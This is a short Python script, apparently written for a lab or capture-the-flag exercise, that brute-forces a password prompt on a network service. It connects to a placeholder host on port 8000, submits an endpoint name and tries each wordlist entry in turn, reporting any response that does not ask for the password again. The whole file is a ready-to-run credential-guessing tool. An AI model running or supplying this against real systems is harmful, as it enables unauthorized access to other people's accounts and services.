import socket

HOST = "TARGET_HOST" #CHANGE THIS
PORT = 8000
ENDPOINT = "ENDPOINT" #CHANGE THIS
WORDLIST = "WORDLIST" #CHANGE THIS

with open(WORDLIST, "r", errors="ignore") as file:
    for line in file:
        password = line.strip()

        if not password:
            continue

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)

        try:
            sock.connect((HOST, PORT))

            # Enter the endpoint
            sock.sendall((ENDPOINT + "\n").encode())

            # Receive the Password: prompt
            prompt = sock.recv(1024).decode(errors="ignore")

            # Send one candidate password
            sock.sendall((password + "\n").encode())

            # Read the response
            response = sock.recv(1024).decode(errors="ignore")

            # Wrong password appears to prompt for Password: again
            if "Password:" not in response:
                print(f"[+] Interesting: {password} -> {response.strip()}")

        except Exception:
            pass

        finally:
            sock.close()

print("---FUZZING COMPLETED---")
